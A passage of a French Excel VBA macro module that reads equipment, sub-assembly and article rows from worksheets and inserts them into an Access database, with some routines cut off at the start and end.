    ThisWorkbook.Sheets(Onglet).Cells(Lig, p_anomalie + 2).Value = Clef_complete
    'ThisWorkbook.Sheets(onglet).Cells(lig, p_anomalie + 3).Value = clef_art
    Design = VBA.UCase(ThisWorkbook.Sheets(Onglet).Cells(Lig, P_design).Value)
    ref_int = VBA.UCase(ThisWorkbook.Sheets(Onglet).Cells(Lig, P_ref_int).Value) ' non recup|fffd|r|fffd|
    nom_int = VBA.UCase(ThisWorkbook.Sheets(Onglet).Cells(Lig, P_nom_int).Value) ' non recupere
    num_serie = VBA.UCase(ThisWorkbook.Sheets(Onglet).Cells(Lig, P_num_serie).Value)
    SACIMMABEC = VBA.UCase(ThisWorkbook.Sheets(Onglet).Cells(Lig, P_sacimmabec).Value)
    qte_articles = VBA.UCase(ThisWorkbook.Sheets(Onglet).Cells(Lig, P_qte).Value)
    Obs = VBA.UCase(ThisWorkbook.Sheets(Onglet).Cells(Lig, P_obs).Value)
    Note = VBA.UCase(ThisWorkbook.Sheets(Onglet).Cells(Lig, P_note).Value)
    piece_rech = VBA.UCase(ThisWorkbook.Sheets(Onglet).Cells(Lig, P_piece_rech).Value)
    If piece_rech = vbNullString Then piece_rech = "N"
    Document = VBA.UCase(ThisWorkbook.Sheets(Onglet).Cells(Lig, P_document).Value)
    Tech = VBA.UCase(ThisWorkbook.Sheets(Onglet).Cells(Lig, P_tech).Value)
    'ind_plan = vba.ucase(ThisWorkbook.Sheets(onglet).Cells(Lig, p_ind_plan).Value)
    If Tech = vbNullString Then Tech = "A"
    'pi|fffd|ce_rech = "F"
    clas_ssen = vbNullString
    ind_plan = vbNullString
    If Document = vbNullString Then
        for_plan = "IN"
        nb_planche = 1
    ElseIf Document = "SP" Then
        for_plan = "SP"
        nb_planche = 0
    ElseIf Document = "A0" Then
        for_plan = Document
        nb_planche = 1
    ElseIf Document = "A1" Then
        for_plan = Document
        nb_planche = 1
    ElseIf Document = "A2" Then
        for_plan = Document
        nb_planche = 1
    ElseIf Document = "A3" Then
        for_plan = Document
        nb_planche = 1
    ElseIf Document = "A4" Then
        for_plan = Document
        nb_planche = 1
    ElseIf Document = "IN" Then
        for_plan = Document
        nb_planche = 1
    ElseIf Document = "A?" Then
        for_plan = Document
        nb_planche = 1
    Else
        for_plan = "a?"
        nb_planche = 1
'            Obs = "#'" + Document + "'#" + Obs
        Obs = "#" + Document + "#" + Obs
    End If
    If NATURE = "B" Then
        PlanMABEC = etude_ref
        suf_mab = etude_suf
        'ref_fab = Ref_int
        'nom_fab = Nom_int
         ref_fab = vbNullString
        nom_fab = vbNullString
        ind_plan = vbNullString
    ElseIf NATURE = "R" Then
        PlanMABEC = etude_ref
        suf_mab = etude_suf
        'ref_fab = Ref_int
        'nom_fab = Nom_int
         ref_fab = vbNullString
        nom_fab = vbNullString
        ind_plan = vbNullString
    ElseIf NATURE = "F" Then
        PlanMABEC = vbNullString
        suf_mab = vbNullString
        nom_fab = VBA.UCase(ThisWorkbook.Sheets(Onglet).Cells(Lig, P_etude_nom).Value)
        ref_fab = etude_ref
        If etude_suf > vbNullString Then ref_fab = ref_fab + "_" + etude_suf
        If ref_int = vbNullString Then ref_int = ref_fab
        If nom_int = vbNullString Then nom_int = nom_fab
    ElseIf NATURE = "C" Then
        PlanMABEC = vbNullString
        suf_mab = vbNullString
        nom_fab = VBA.UCase(ThisWorkbook.Sheets(Onglet).Cells(Lig, P_etude_nom).Value)
        ref_fab = etude_ref
        If etude_suf > vbNullString Then ref_fab = ref_fab + "_" + etude_suf
    Else
        NATURE = "C"
        PlanMABEC = vbNullString
        suf_mab = vbNullString
        nom_fab = VBA.UCase(ThisWorkbook.Sheets(Onglet).Cells(Lig, P_etude_nom).Value)
        ref_fab = etude_ref
        If etude_suf > vbNullString Then ref_fab = ref_fab + "_" + etude_suf
    End If
    gen_ctrl_art
End Sub


'***************************************
'G|fffd|n|fffd|ration des Fichiers d'|fffd|change RENOM
'***************************************
Sub gen_fic_renom()
    ' On d|fffd|sactive tout ce qui peut l'|fffd|tre
    GererConfiguration False
    frmExportRenom.Show
    ' On active tout ce qui doit l'|fffd|tre
    GererConfiguration True
End Sub


Sub equipmt_exp()
    Dim Fin As Boolean
    Dim i As Integer
    Dim R|fffd|pertoire As String
    Dim NbSSEN, Gel, CodeERR As Double
    Dim Inventaire As String, SufInv As String, Matricule As String, ClasEqu As String, LibMat As String, LibInv As String, NomFour As String, RefMatch As String, NumMatch As String, FlagMARQ As String, FlagETAT As String, FlagOLD As String, DateCrt As String, DateMAJ As String
    Onglet = shEquipmt
    Chemin = frmExportRenom.lblpath.Caption
    Gel = 0
    NbSSEN = 0
    CodeERR = 0
    
    Dim cn As ADODB.Connection
    Dim rs As ADODB.Recordset
    Dim PathDB01, requete As String
    Set cn = New ADODB.Connection
    Set rs = New ADODB.Recordset
    Dim cmdadd As New ADODB.Command
    'PathDB01 = frmExportRenom.lblpath.Caption
    PathDB01 = "D:\Public"
    cn.Open "Provider=Microsoft.Jet.OLEDB.4.0;" & "Data Source=" & PathDB01 & "\VERL01.MDB;"
    Set cmdadd.ActiveConnection = cn
    
    Lig = 2
    Fin = False
    i = 1
    Do Until Fin
        If VBA.UCase(ThisWorkbook.Sheets(Onglet).Cells(Lig, 5).Value) <> vbNullString Then
            frmExportRenom.txtNbEquip.Text = Lig
            
            'TN2
            lib_tn2 = VBA.UCase(ThisWorkbook.Sheets(Onglet).Cells(Lig, 1).Value)
            N_mat = VBA.UCase(ThisWorkbook.Sheets(Onglet).Cells(Lig, 6).Value)
            Matricule = VBA.Mid(N_mat, 1, 12)
            N_invent = VBA.UCase(ThisWorkbook.Sheets(Onglet).Cells(Lig, 3).Value)
            Inventaire = VBA.Mid(N_invent, 1, 10)
            N_suffixe = VBA.UCase(ThisWorkbook.Sheets(Onglet).Cells(Lig, 4).Value)
            SufInv = VBA.Mid(N_suffixe, 1, 5)
            cod_class = VBA.UCase(ThisWorkbook.Sheets(Onglet).Cells(Lig, 2).Value)
            ClasEqu = VBA.Mid(cod_class, 1, 3)
            Pos_creat = i 'VBA.Trim(VBA.Str(ThisWorkbook.Sheets(Onglet).Cells(Lig, 11).Value))
            lib_invent = VBA.UCase(ThisWorkbook.Sheets(Onglet).Cells(Lig, 5).Value) ' + "#'" + pos_creat + "'#"
            LibInv = VBA.Mid(lib_invent, 1, 40)
            NbSSEN = Pos_creat
            lib_mat = VBA.UCase(ThisWorkbook.Sheets(Onglet).Cells(Lig, 7).Value)
            LibMat = VBA.Mid(lib_mat, 1, 50)
            nom_four_equ = VBA.UCase(ThisWorkbook.Sheets(Onglet).Cells(Lig, 8).Value)
            NomFour = VBA.Mid(nom_four_equ, 1, 28)
            ref_mach_equ = VBA.UCase(ThisWorkbook.Sheets(Onglet).Cells(Lig, 9).Value)
            RefMatch = VBA.Mid(ref_mach_equ, 1, 15)
            DateCrt = Date_creat
            FlagETAT = "F"
            Lig = Lig + 1
            i = i + 1
            
            requete = "Insert into TVREQUIPMT (POSCRE, CODE_TN2, INVENTAIRE, SUF_INV, MATRICULE, CLAS_EQU, LIB_MAT, LIB_INV, NOM_FOUR, REF_MACH, NUM_MACH, NB_SSEN, GEL, FLAG_MARQ, FLAG_ETAT, FLAG_OLD, CODE_ERR) values ( " & i & ", '" & "    1" & "', '" & Inventaire & "', '" & SufInv & "', '" & Matricule & "', '" & ClasEqu & "', '" & LibMat & "', '" & LibInv & "', '" & NomFour & "', '" & RefMatch & "', '" & NumMatch & "', " & NbSSEN & ", " & Gel & ", '" & FlagMARQ & "', '" & FlagETAT & "', '" & FlagOLD & "', " & CodeERR & ")"
            cn.Execute (requete)
            
        Else
            Fin = True
        End If
    Loop
    
    requete = "Update TVRSSUNIT set NB_EQU=" & Lig - 2 & vbNullString
    cn.Execute (requete)
    
End Sub


Sub ssen_exp()
    Dim Fin As Boolean
    Dim i As Integer
    Dim NbSSEN As Double, Gel As Double, CodeERR As Double, PosCrt As Double, QtSSE As Double
    Dim Inventaire As String, SufInv As String, Matricule As String, NumSSE As String, SufSSE As String, ClasSSE As String, LibMat As String, LibInv As String, NomFour As String, RefFOUR As String, LibSSE As String, RefMatch As String, NumMatch As String, FlagMARQ As String, FlagETAT As String, FlagOLD As String, DateCrt As String, DateMAJ As String, SqlEqu As String
        
    Gel = 0
    NbSSEN = 0
    CodeERR = 0
    PosCrt = 0
    QtSSE = 0
    FlagETAT = "F"
    
        Onglet = shSsEnsemble
        Chemin = frmExportRenom.lblpath.Caption
        'Chemin = VBA.UCase(ThisWorkbook.Sheets(shCde_Nomenclature).Cells(20, 3).Value)
        'Fic_ssen = Chemin + "\Tssen.exp"
        
        Dim cn As ADODB.Connection
        Dim rs, rsEQUIPMT As ADODB.Recordset
        Dim PathDB01, requete As String
        Set cn = New ADODB.Connection
        Set rs = New ADODB.Recordset
        Set rsEQUIPMT = New ADODB.Recordset
        Dim cmdadd As New ADODB.Command
        'PathDB01 = frmExportRenom.lblpath.Caption
        PathDB01 = "D:\Public"
        cn.Open "Provider=Microsoft.Jet.OLEDB.4.0;" & "Data Source=" & PathDB01 & "\VERL01.MDB;"
        Set cmdadd.ActiveConnection = cn

        
        'Open Fic_ssen For Output As #1
        Lig = 2
        i = 1
        Fin = False
        Do Until Fin
            If VBA.UCase(ThisWorkbook.Sheets(Onglet).Cells(Lig, 5).Value) <> vbNullString Then
                'ThisWorkbook.Sheets(shCde_Nomenclature).Cells(22, 3).Value = Lig
                frmExportRenom.txtNbSEns.Text = Lig
                
                ' ajout du matricule
                ' ********************
                N_mat = VBA.UCase(ThisWorkbook.Sheets(Onglet).Cells(Lig, 3).Value)
                Matricule = VBA.Mid(N_mat, 1, 12)
                N_invent = VBA.UCase(ThisWorkbook.Sheets(Onglet).Cells(Lig, 1).Value)
                Inventaire = VBA.Mid(N_invent, 1, 10)
                N_suffixe = VBA.UCase(ThisWorkbook.Sheets(Onglet).Cells(Lig, 2).Value)
                SufInv = VBA.Mid(N_suffixe, 1, 5)
                num_ssen = VBA.UCase(ThisWorkbook.Sheets(Onglet).Cells(Lig, 5).Value)
                NumSSE = VBA.Mid(num_ssen, 1, 10)
                suf_ssen = VBA.UCase(ThisWorkbook.Sheets(Onglet).Cells(Lig, 6).Value)
                SufSSE = VBA.Mid(suf_ssen, 1, 5)
                clas_ssen = "    "
                ClasSSE = VBA.Mid(clas_ssen, 1, 5)
                Nom_Four = VBA.UCase(ThisWorkbook.Sheets(Onglet).Cells(Lig, 8).Value)
                NomFour = VBA.Mid(Nom_Four, 1, 28)
                Ref_Four = VBA.UCase(ThisWorkbook.Sheets(Onglet).Cells(Lig, 9).Value)
                RefFOUR = VBA.Mid(Ref_Four, 1, 15)
                PosCrt = i 'VBA.Trim(VBA.Str(ThisWorkbook.Sheets(Onglet).Cells(Lig, 13).Value))
                lib_ssen = VBA.UCase(ThisWorkbook.Sheets(Onglet).Cells(Lig, 7).Value)
                LibSSE = VBA.Mid(lib_ssen, 1, 40)
                qte_ssen = VBA.UCase(ThisWorkbook.Sheets(Onglet).Cells(Lig, 10).Value)
                QtSSE = VBA.Mid(qte_ssen, 1, 3)

                Lig = Lig + 1
                i = i + 1
                
                requete = "Insert into TVRSSEN (INVENTAIRE, SUF_INV, MATRICULE, POSCRE, NUM_SSEN, SUF_SSEN, CLAS_SSEN, LIB_SSEN, NOM_FOUR, REF_FOUR, QTE, GEL, FLAG_MARQ, FLAG_ETAT, FLAG_OLD, CODE_ERR) values ('" & Inventaire & "', '" & SufInv & "', '" & Matricule & "', " & PosCrt & ", '" & NumSSE & "', '" & SufSSE & "', '" & ClasSSE & "', '" & LibSSE & "', '" & NomFour & "', '" & RefFOUR & "', " & QtSSE & ", " & Gel & ", '" & FlagMARQ & "', '" & FlagETAT & "', '" & FlagOLD & "', " & CodeERR & ")"
                cn.Execute (requete)
            Else
                Fin = True
            End If
        Loop
        'Close #1
End Sub


Sub ecrit_exp_article()
    Dim Fin As Boolean
        
    Onglet = shArticles
    Worksheets(Onglet).Range("A1:Y20000").Sort Key1:=Worksheets(Onglet).Range("Y2"), Order1:=xlAscending, Header:= _
    xlYes, OrderCustom:=1, MatchCase:=False, Orientation:=xlTopToBottom, _
    DataOption1:=xlSortNormal
        
    'Open Fic_nomencl For Output As #1
    Dim i As Integer
    Lig = 2
    i = 1
    Fin = False
    Do Until Fin
        If ThisWorkbook.Sheets(Onglet).Cells(Lig, 13).Value <> vbNullString Or ThisWorkbook.Sheets(Onglet).Cells(Lig, 1).Value <> vbNullString Then
            If VBA.UCase(ThisWorkbook.Sheets(Onglet).Cells(Lig, 25).Value) <> VBA.UCase(ThisWorkbook.Sheets(Onglet).Cells(Lig + 1, 25).Value) Then
                'ThisWorkbook.Sheets(shCde_Nomenclature).Cells(23, 3).Value = Lig - 1
                frmExportRenom.txtNbArtcls.Text = Lig - 1
                'ThisWorkbook.Sheets("commande").Cells(27, 11).Value = 0
                num_ssen = VBA.UCase(ThisWorkbook.Sheets(Onglet).Cells(Lig, 1).Value)
                suf_ssen = VBA.UCase(ThisWorkbook.Sheets(Onglet).Cells(Lig, 2).Value)
                NATURE = VBA.UCase(ThisWorkbook.Sheets(Onglet).Cells(Lig, 3).Value)
                Tech = VBA.UCase(ThisWorkbook.Sheets(Onglet).Cells(Lig, 4).Value)
                Repere = VBA.UCase(ThisWorkbook.Sheets(Onglet).Cells(Lig, 5).Value)
                PlanMABEC = VBA.UCase(ThisWorkbook.Sheets(Onglet).Cells(Lig, 6).Value)
                suf_mab = VBA.UCase(ThisWorkbook.Sheets(Onglet).Cells(Lig, 7).Value)
                ind_plan = VBA.UCase(ThisWorkbook.Sheets(Onglet).Cells(Lig, 8).Value)
                for_plan = VBA.UCase(ThisWorkbook.Sheets(Onglet).Cells(Lig, 9).Value)
                nb_planche = VBA.UCase(ThisWorkbook.Sheets(Onglet).Cells(Lig, 10).Value)
                nom_fab = VBA.UCase(ThisWorkbook.Sheets(Onglet).Cells(Lig, 11).Value)
                ref_fab = VBA.UCase(ThisWorkbook.Sheets(Onglet).Cells(Lig, 12).Value)
                Design = VBA.UCase(ThisWorkbook.Sheets(Onglet).Cells(Lig, 13).Value)
                num_serie = VBA.UCase(ThisWorkbook.Sheets(Onglet).Cells(Lig, 14).Value)
                qte_articles = VBA.UCase(ThisWorkbook.Sheets(Onglet).Cells(Lig, 15).Value)
                Obs = VBA.UCase(ThisWorkbook.Sheets(Onglet).Cells(Lig, 16).Value)
                Note = VBA.UCase(ThisWorkbook.Sheets(Onglet).Cells(Lig, 17).Value)
                piece_rech = VBA.UCase(ThisWorkbook.Sheets(Onglet).Cells(Lig, 18).Value)
                SACIMMABEC = VBA.UCase(ThisWorkbook.Sheets(Onglet).Cells(Lig, 19).Value)
                Ref_Four = VBA.UCase(ThisWorkbook.Sheets(Onglet).Cells(Lig, 20).Value)
                Nom_Four = VBA.UCase(ThisWorkbook.Sheets(Onglet).Cells(Lig, 21).Value)
                Pos_creat = VBA.Trim(VBA.Str(ThisWorkbook.Sheets(Onglet).Cells(Lig, 24).Value))
                
                article_exp
                
            End If
            Lig = Lig + 1
            i = i + 1
         Else
            Fin = True
         End If
     Loop
     Worksheets(Onglet).Range("V2").Sort _
        Key1:=Worksheets(Onglet).Columns("V"), _
        Order1:=xlAscending, _
        Header:=xlGuess
End Sub

' On est dans l'onglet Articles
Sub ecrit_exp_article_Doublons()
    Dim Fin As Boolean
    Dim i As Integer
    Onglet = shArticles
        Worksheets(Onglet).Range("A1:Y20000").Sort Key1:=Worksheets(Onglet).Range("Y2"), Order1:=xlAscending, Header:= _
        xlYes, OrderCustom:=1, MatchCase:=False, Orientation:=xlTopToBottom, _
        DataOption1:=xlSortNormal
        
    Chemin = frmExportRenom.lblpath.Caption
    
    Lig = 2
    i = 1
    Fin = False
    Do Until Fin
        If ThisWorkbook.Sheets(Onglet).Cells(Lig, 13).Value <> vbNullString Or ThisWorkbook.Sheets(Onglet).Cells(Lig, 1).Value <> vbNullString Then
            frmExportRenom.txtNbArtcls.Text = Lig - 1
            'ThisWorkbook.Sheets("commande").Cells(27, 11).Value = 0
            num_ssen = VBA.UCase(ThisWorkbook.Sheets(Onglet).Cells(Lig, 1).Value)
            suf_ssen = VBA.UCase(ThisWorkbook.Sheets(Onglet).Cells(Lig, 2).Value)
            NATURE = VBA.UCase(ThisWorkbook.Sheets(Onglet).Cells(Lig, 3).Value)
            Tech = VBA.UCase(ThisWorkbook.Sheets(Onglet).Cells(Lig, 4).Value)
            Repere = VBA.UCase(ThisWorkbook.Sheets(Onglet).Cells(Lig, 5).Value)
            PlanMABEC = VBA.UCase(ThisWorkbook.Sheets(Onglet).Cells(Lig, 6).Value)
            suf_mab = VBA.UCase(ThisWorkbook.Sheets(Onglet).Cells(Lig, 7).Value)
            ind_plan = VBA.UCase(ThisWorkbook.Sheets(Onglet).Cells(Lig, 8).Value)
            for_plan = VBA.UCase(ThisWorkbook.Sheets(Onglet).Cells(Lig, 9).Value)
            nb_planche = VBA.UCase(ThisWorkbook.Sheets(Onglet).Cells(Lig, 10).Value)
            nom_fab = VBA.UCase(ThisWorkbook.Sheets(Onglet).Cells(Lig, 11).Value)
            ref_fab = VBA.UCase(ThisWorkbook.Sheets(Onglet).Cells(Lig, 12).Value)
            Design = VBA.UCase(ThisWorkbook.Sheets(Onglet).Cells(Lig, 13).Value)
            num_serie = VBA.UCase(ThisWorkbook.Sheets(Onglet).Cells(Lig, 14).Value)
            qte_articles = VBA.UCase(ThisWorkbook.Sheets(Onglet).Cells(Lig, 15).Value)
            Obs = VBA.UCase(ThisWorkbook.Sheets(Onglet).Cells(Lig, 16).Value)
            Note = VBA.UCase(ThisWorkbook.Sheets(Onglet).Cells(Lig, 17).Value)
            piece_rech = VBA.UCase(ThisWorkbook.Sheets(Onglet).Cells(Lig, 18).Value)
            SACIMMABEC = VBA.UCase(ThisWorkbook.Sheets(Onglet).Cells(Lig, 19).Value)
            Ref_Four = VBA.UCase(ThisWorkbook.Sheets(Onglet).Cells(Lig, 20).Value)
            Nom_Four = VBA.UCase(ThisWorkbook.Sheets(Onglet).Cells(Lig, 21).Value)
            Pos_creat = i 'VBA.Trim(VBA.Str(ThisWorkbook.Sheets(Onglet).Cells(Lig, 24).Value))
            
            article_exp
                    
           Lig = Lig + 1
           i = i + 1
        Else
           Fin = True
        End If
    Loop
    Worksheets(Onglet).Range("V2").Sort _
        Key1:=Worksheets(Onglet).Columns("V"), _
        Order1:=xlAscending, _
        Header:=xlGuess
End Sub

' Export des donn|fffd|es de l'onglet articles dans le fichier NOMENCL.DBF
Sub article_exp()
    Dim POSCRE As Integer, Niveau As Integer, NBPlache As Integer, MTBF As Integer, DELAIS As Integer, PRIX As Integer, NumDCM As Integer, NumDPG As Integer, CodeERR As Integer
    Dim NumSSEN As String, SufSSEN As String, SACIMMABECE As String, PlanMABECE As String, SufMAB As String, RefFOUR As String, RefFAB As String, NomFourE As String, NomFAB As String, NATUREE As String, TechE As String, DesignE As String, RepereE As String, QteE As String
    Dim IndiPlan As String, ForPlan As String, ObsE As String, ObsE1 As String, NoteE As String, Magasin As String, IndMag As String, Champ1U As String, Champ2U As String, Champ1E As String, Champ2E As String, Chmp3E As String, PieceRech As String, PiecePREC As String, PieceDoub As String
    Dim VSacim As String, NumSerie As String, FlagDCM As String, FlagDPG As String, FlagMARQ As String, FlagETAT As String, FlagOLD As String
    
    POSCRE = 0
    Niveau = 0
    NBPlache = 0
    MTBF = 0
    DELAIS = 0
    PRIX = 0
    NumDCM = 0
    NumDPG = 0
    QteE = 0
    CodeERR = 0
    
    Dim cn_Art As ADODB.Connection
    Dim rs_Art As ADODB.Recordset
    Dim PathDB01_Art, requete_Art As String
    Set cn_Art = New ADODB.Connection
    Set rs_Art = New ADODB.Recordset
    Dim cmdadd_Art As New ADODB.Command
    'PathDB01_Art = frmExportRenom.lblpath.Caption
    PathDB01_Art = "D:\Public"
    cn_Art.Open "Provider=Microsoft.Jet.OLEDB.4.0;" & "Data Source=" & PathDB01_Art & "\VERL01.MDB;"
    Set cmdadd_Art.ActiveConnection = cn_Art

    ' 10 car
    NumSSEN = VBA.Mid(num_ssen, 1, 10)
    ' 5 car
    SufSSEN = VBA.Mid(suf_ssen, 1, 5)
    ' 1 car
    NATUREE = VBA.Mid(NATURE, 1, 1)
    ' 1 car
    TechE = VBA.Mid(Tech, 1, 1)
    ' 10 car
    SACIMMABECE = VBA.Mid(SACIMMABEC, 1, 10)
    ' 10 car
    RepereE = VBA.Mid(Repere, 1, 10)
    ' 10 car
    PlanMABECE = VBA.Mid(PlanMABEC, 1, 10)
    ' 4 car
    SufMAB = VBA.Mid(suf_mab, 1, 4)
    ' 1 car
    IndiPlan = VBA.Mid(ind_plan, 1, 1)
    ' 2 car
    ForPlan = VBA.Mid(for_plan, 1, 2)
    ' 3 car
    NBPlache = VBA.Mid(nb_planche, 1, 3)
    ' 100 car
    DesignE = VBA.Mid(Design, 1, 100)
    DesignE = Replace(DesignE, "'", " ")
    ' 50 car
    RefFAB = VBA.Mid(ref_fab, 1, 50)
    ' 28 car
    NomFAB = VBA.Mid(nom_fab, 1, 28)
    ' 3 car
    QteE = VBA.Mid(qte_articles, 1, 3)
    If QteE = vbNullString Then
        QteE = "0"
    End If
    ' 28 car
    NomFourE = VBA.Mid(Nom_Four, 1, 28)
    ' 15 car
    RefFOUR = VBA.Mid(Ref_Four, 1, 15)
    ' 1 car
    PiecePREC = "N" ' precaution
    PieceRech = VBA.Mid(piece_rech, 1, 1)
    PieceDoub = "N" 'doublon
    ' 40 car : contient la concatenation de Document et de Observation
    ObsE = VBA.Mid(Obs, 1, 40)
    ' 15 car : le champ NOTE n'existant plus, on stocke l'info dans CHAMP1U / CHAMP2U / CHAMP1E
    NoteE = VBA.Right("               " & Note, 15)
    Champ1U = VBA.Mid(NoteE, 1, 5)
    Champ2U = VBA.Mid(NoteE, 6, 5)
    Champ1E = VBA.Mid(NoteE, 11, 5)
    ' 10 car
    POSCRE = Pos_creat
    
    ' On insert les donn|fffd|es
     requete_Art = "Insert into TVRNOMENCL (NUM_SSEN, SUF_SSEN, NATURE, TECH, SACIMMABEC, REPERE, PLANMABEC, SUF_MAB, INDI_PLAN, FOR_PLAN, NB_PLANCHE, DESIGN, REF_FAB, NOM_FAB, QTE, NOM_FOUR, REF_FOUR, PIECE_PREC, PIECE_RECH, PIECE_DOUB, OBS, POSCRE, NIVEAU, V_SACIM, CHAMP1U, CHAMP2U, CHAMP1E) values ('" & NumSSEN & "', '" & SufSSEN & "', '" & NATUREE & "', '" & TechE & "', '" & SACIMMABECE & "', '" & RepereE & "', '" & PlanMABECE & "', '" & SufMAB & "', '" & IndiPlan & "', '" & ForPlan & "', " & NBPlache & ", '" & DesignE & "', '" & RefFAB & "', '" & NomFAB & "', " & QteE & ", '" & NomFourE & "', '" & RefFOUR & "', '" & PiecePREC & "', '" & PieceRech & "', '" & PieceDoub & "', '" & ObsE & "', " & POSCRE & ", 0, 'N', '" & Champ1U & "', '" & Champ2U & "', '" & Champ1E & "')"
'     requete_Art = "Insert into TVRNOMENCL (NUM_SSEN, SUF_SSEN, NATURE, TECH, SACIMMABEC, REPERE, PLANMABEC, SUF_MAB, INDI_PLAN, FOR_PLAN, NB_PLANCHE, DESIGN, REF_FAB, NOM_FAB, QTE, NOM_FOUR, REF_FOUR, PIECE_PREC, PIECE_RECH, PIECE_DOUB, OBS, POSCRE, NIVEAU, V_SACIM) values ('" & NumSSEN & "', '" & SufSSEN & "', '" & NATUREE & "', '" & TechE & "', '" & SACIMMABECE & "', '" & RepereE & "', '" & PlanMABECE & "', '" & SufMAB & "', '" & IndiPlan & "', '" & ForPlan & "', " & NBPlache & ", '" & DesignE & "', '" & RefFAB & "', '" & NomFAB & "', " & QteE & ", '" & NomFourE & "', '" & RefFOUR & "', '" & PiecePREC & "', '" & PieceRech & "', '" & PieceDoub & "', '" & ObsE & "', " & POSCRE & ", 0, 'N')"
    cn_Art.Execute (requete_Art)
End Sub

Sub statut_exp()
    Dim statut As String
    Onglet = shSsEnsemble
    'Chemin = VBA.UCase(ThisWorkbook.Sheets(shCde_Nomenclature).Cells(20, 3).Value)
    Chemin = frmExportRenom.lblpath.Caption
    Fic_statut = Chemin + "\statut.bdn"
    Open Fic_statut For Output As #1
    statut = " 3.003.08a          1  1  0  325322812807200413:33UB100065931                       PEC                                                                        *"
    Print #1, statut
    Close #1    ' Ferme le fichier.
    ' supprime le fichier Itrait
    'On Error Resume Next
    If Dir(Chemin + "\istrait.asc") > vbNullString Then Kill (Chemin + "\istrait.asc")
End Sub

' On documente l'onglet Articles a partir des donn|fffd|es de l'onglet Materiel
Sub gen_ctrl_art()
    'ThisWorkbook.Sheets(shCde_Nomenclature).Cells(15, 3).Value = ind_articles
    ind_articles = ind_articles + 1
    'ThisWorkbook.Sheets(shArticles).Cells(ind_articles, 22).Value = ind_articles
    ThisWorkbook.Sheets(shArticles).Cells(ind_articles, 1).Value = num_ssen
    ThisWorkbook.Sheets(shArticles).Cells(ind_articles, 2).Value = suf_ssen
    ThisWorkbook.Sheets(shArticles).Cells(ind_articles, 3).Value = NATURE
    ThisWorkbook.Sheets(shArticles).Cells(ind_articles, 4).Value = Tech
    ThisWorkbook.Sheets(shArticles).Cells(ind_articles, 5).Value = Repere
    ThisWorkbook.Sheets(shArticles).Cells(ind_articles, 6).Value = PlanMABEC
    ThisWorkbook.Sheets(shArticles).Cells(ind_articles, 7).Value = suf_mab
    ThisWorkbook.Sheets(shArticles).Cells(ind_articles, 8).Value = ind_plan
    ThisWorkbook.Sheets(shArticles).Cells(ind_articles, 9).Value = for_plan
    ThisWorkbook.Sheets(shArticles).Cells(ind_articles, 10).Value = nb_planche
    ThisWorkbook.Sheets(shArticles).Cells(ind_articles, 11).Value = nom_fab
    ThisWorkbook.Sheets(shArticles).Cells(ind_articles, 12).Value = ref_fab
    ThisWorkbook.Sheets(shArticles).Cells(ind_articles, 13).Value = Design
    ThisWorkbook.Sheets(shArticles).Cells(ind_articles, 14).Value = num_serie
    ThisWorkbook.Sheets(shArticles).Cells(ind_articles, 15).Value = qte_articles
    ThisWorkbook.Sheets(shArticles).Cells(ind_articles, 16).Value = Obs
    ThisWorkbook.Sheets(shArticles).Cells(ind_articles, 17).Value = Note
    ThisWorkbook.Sheets(shArticles).Cells(ind_articles, 18).Value = piece_rech
    ThisWorkbook.Sheets(shArticles).Cells(ind_articles, 19).Value = SACIMMABEC
    ThisWorkbook.Sheets(shArticles).Cells(ind_articles, 20).Value = ref_int
    ThisWorkbook.Sheets(shArticles).Cells(ind_articles, 21).Value = nom_int
    
    ThisWorkbook.Sheets(shArticles).Cells(ind_articles, 25).Value = Clef_complete
      
    Nb_element_bdn = Nb_element_bdn + 1
    ThisWorkbook.Sheets(shArticles).Cells(ind_articles, 24).Value = Pos_creat + Nb_element_bdn
    ThisWorkbook.Sheets(shArticles).Cells(ind_articles, 23).Value = Date_creat
    If Document <> "SP" Then
        nb_document = nb_document + 1
    End If
End Sub

Sub gen_ctrl_ssen()
    ThisWorkbook.Sheets(shSsEnsemble).Cells(ind_ssen, 15).Value = Num_ligne
    ThisWorkbook.Sheets(shSsEnsemble).Cells(ind_ssen, 1).Value = N_invent
    ThisWorkbook.Sheets(shSsEnsemble).Cells(ind_ssen, 2).Value = N_suffixe
    ThisWorkbook.Sheets(shSsEnsemble).Cells(ind_ssen, 3).Value = N_mat
    ThisWorkbook.Sheets(shSsEnsemble).Cells(ind_ssen, 4).Value = clas_ssen
    ThisWorkbook.Sheets(shSsEnsemble).Cells(ind_ssen, 5).Value = num_ssen
    ThisWorkbook.Sheets(shSsEnsemble).Cells(ind_ssen, 6).Value = suf_ssen
    ThisWorkbook.Sheets(shSsEnsemble).Cells(ind_ssen, 7).Value = lib_ssen
    ThisWorkbook.Sheets(shSsEnsemble).Cells(ind_ssen, 8).Value = Nom_Four
    ThisWorkbook.Sheets(shSsEnsemble).Cells(ind_ssen, 9).Value = Ref_Four
    ThisWorkbook.Sheets(shSsEnsemble).Cells(ind_ssen, 10).Value = qte_ssen

    ThisWorkbook.Sheets(shSsEnsemble).Cells(ind_ssen, 12).Value = Date_creat
    Nb_element_bdn = Nb_element_bdn + 1
    ThisWorkbook.Sheets(shSsEnsemble).Cells(ind_ssen, 13).Value = Pos_creat + Nb_element_bdn
    If Document <> "SP" Then
        nb_document = nb_document + 1
    End If
End Sub

Sub charge_art(Cas)
    Dim clef_art, clef_ssen As String
    Dim p_anomalie As Integer
    p_anomalie = 23


    Repere = VBA.UCase(ThisWorkbook.Sheets(Onglet).Cells(Lig, P_rep_equ).Value) ' a voir
    NATURE = VBA.UCase(ThisWorkbook.Sheets(Onglet).Cells(Lig, P_categorie).Value)
    etude_ref = VBA.UCase(ThisWorkbook.Sheets(Onglet).Cells(Lig, P_etude_ref).Value)
    etude_suf = VBA.UCase(ThisWorkbook.Sheets(Onglet).Cells(Lig, P_etude_suf).Value)
    
    clef_art = Repere + ":" + etude_ref + "_" + etude_suf
    clef_ssen = num_ssen + "_" + suf_ssen
    Clef_complete = clef_ssen + ":" + clef_art ' modif du 30/03/2007
      
    Design = VBA.UCase(ThisWorkbook.Sheets(Onglet).Cells(Lig, P_design).Value)
    ref_int = VBA.UCase(ThisWorkbook.Sheets(Onglet).Cells(Lig, P_ref_int).Value) ' non recup|fffd|r|fffd|
    nom_int = VBA.UCase(ThisWorkbook.Sheets(Onglet).Cells(Lig, P_nom_int).Value) ' non recupere
        
    num_serie = VBA.UCase(ThisWorkbook.Sheets(Onglet).Cells(Lig, P_num_serie).Value)
    SACIMMABEC = VBA.UCase(ThisWorkbook.Sheets(Onglet).Cells(Lig, P_sacimmabec).Value)
